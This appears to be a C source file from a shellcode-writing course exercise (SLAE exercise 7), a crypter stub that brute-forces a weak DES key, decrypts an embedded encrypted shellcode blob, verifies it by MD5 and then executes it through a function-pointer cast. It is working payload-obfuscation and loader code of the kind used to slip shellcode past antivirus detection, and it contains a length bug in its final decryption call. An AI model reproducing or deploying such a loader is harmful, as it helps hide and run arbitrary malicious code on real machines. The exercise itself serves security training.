#include <stdlib.h>
#include <string.h>
#include <openssl/des.h>
#include <openssl/md5.h>
#include <stdio.h>
#include <time.h>
#include <stdbool.h>

//Filename: bruteForceDecrypter.c
//Author: Jonathan So
//Student ID: SLAE-1470
//SLAE-Exercise 7
//Complie: gcc bruteForceDecrypter.c -o bruteForceDecrypter -lcrypto

//Character pool for key
unsigned char key_pool[] = {0xA,0xB,0xC,0xD,0xE};
DES_cblock iv = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
//Temp variable for key
unsigned char key[8];
DES_cblock testKey;
DES_key_schedule SchtestKey;
MD5_CTX ctx;
unsigned char testChecksum[16];
//Replace here
unsigned char encryptShellCode[56] = {0x3F,0xD4,0xB0,0xC7,0xC1,0x20,0x15,0x40,0xB6,0x47,0x5C,0x14,0xDD,0x4A,0xD5,0x43,0xAF,0x56,0xDD,0x5F,0x9E,0x10,0xC4,0xE0,0xAF,0xC3,0xB2,0x2D,0x22,0x0D,0x2F,0xFB,0x0D,0x8F,0x7D,0xCB,0x46,0xB8,0x04,0x71,0x46,0x21,0x35,0xB4,0xAF,0xD5,0x06,0x43,0xFF,0xEF,0x54,0x49,0xAA,0xED,0x83,0x27};
unsigned char encryptChecksum[16] = {0xB1,0x90,0x59,0x76,0xF8,0x93,0xEC,0xE4,0x4B,0xE5,0x91,0xAF,0x4F,0x5C,0x25,0x4D};
unsigned char decryptShellCode[56];
//Replace End
unsigned char decryptChecksum[16];
//Debug mode value
int debugMode = 0;
//Functions
void print_data(const char *title, const void* data, int len);
int bfDecrypt();
void execute(unsigned char shellcode[]);

int main(int argc, char *argv[])
{
	if( argc == 2 ) {
		if(strcmp(argv[1],"-d") == 0){
			
			debugMode = 1;	
		}
	}
	memset(testChecksum,0,sizeof(testChecksum));
	memset(iv,0,sizeof(DES_cblock));
	DES_set_odd_parity(&iv);
	//Decryption start
	int found = bfDecrypt();
	if(found == 1){
		memset(iv,0,sizeof(DES_cblock)); // reset IV value everytime
		DES_set_odd_parity(&iv);
		DES_cbc_encrypt( (unsigned char*)encryptShellCode, (unsigned char*)decryptShellCode, sizeof(encryptChecksum), &SchtestKey,&iv,DES_DECRYPT);

		//Decrypt Info
		printf("\n Key Found:\n");
		print_data("\n 1.Random Key ",testKey,sizeof(testKey));
		print_data("\n 2.Encrypted",encryptShellCode,sizeof(encryptShellCode));
		print_data("\n 3.Decrypted",decryptShellCode,sizeof(encryptShellCode));
		printf("\n 4.Execute Shellcode\n");
		execute(decryptShellCode);
	}else{
		printf("Decrypt failed\n");
	}
	//Decryption end
	
	return 0;
}

void execute(unsigned char shellcode[]){
	printf("\n Shellcode Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

int bfDecrypt(){
	int found = 0;
	for(int i =0; i<sizeof(key_pool); i++){
		for(int j =0; j<sizeof(key_pool); j++){
			for(int k =0; k<sizeof(key_pool); k++){
				for(int l=0; l<sizeof(key_pool); l++){
					for(int m=0; m<sizeof(key_pool); m++){
						for(int n=0; n<sizeof(key_pool); n++){
							for(int o=0; o<sizeof(key_pool); o++){
								for(int p=0; p<sizeof(key_pool); p++){
									key[0] = key_pool[i];
									key[1] = key_pool[j];
									key[2] = key_pool[k];
									key[3] = key_pool[l];
									key[4] = key_pool[m];
									key[5] = key_pool[n];
									key[6] = key_pool[o];
									key[7] = key_pool[p];					
									memcpy(testKey, key, sizeof(key));

									DES_set_key_unchecked(&testKey, &SchtestKey);
									
									memset(iv,0,sizeof(DES_cblock)); // reset iv value
									DES_set_odd_parity(&iv);
									//Decrypt shellcode
									DES_cbc_encrypt( (unsigned char*)encryptShellCode, (unsigned char*)decryptShellCode, sizeof(encryptShellCode), &SchtestKey,&iv,DES_DECRYPT);
																	
									memset(iv,0,sizeof(DES_cblock));
									DES_set_odd_parity(&iv);
									DES_cbc_encrypt( (unsigned char*)encryptChecksum, (unsigned char*)decryptChecksum, sizeof(encryptChecksum), &SchtestKey,&iv,DES_DECRYPT);
									MD5_Init(&ctx);
									MD5_Update(&ctx, decryptShellCode, sizeof(encryptShellCode));
									MD5_Final(testChecksum, &ctx);
									if(debugMode == 1){
										//Testing info
										printf("\ni=%d,j=%d,k=%d,l=%d,m=%d,n=%d,o=%d,p=%d",i,j,k,l,m,n,o,p);
										print_data("\n testKey ",testKey,sizeof(key));
										print_data("Decrypted",decryptShellCode,sizeof(encryptShellCode));
										print_data("MD5 regenera ",testChecksum,sizeof(encryptChecksum));
										print_data("MD5 decrypt  ",decryptChecksum,sizeof(encryptChecksum));
									}
									if(memcmp(testChecksum,decryptChecksum,sizeof(encryptChecksum))==0){
										return 1;
									}
								}
							}
						}			
					}	
				}	
			}
		}
	}
	return 0;
}

void print_data(const char *title, const void* data, int len)
{
	printf("%s : ",title);
	const unsigned char * p = (const unsigned char*)data;
	int i = 0;
	
	for (; i<len;++i)
		printf("%02X ", *p++);
	printf("\n");
}
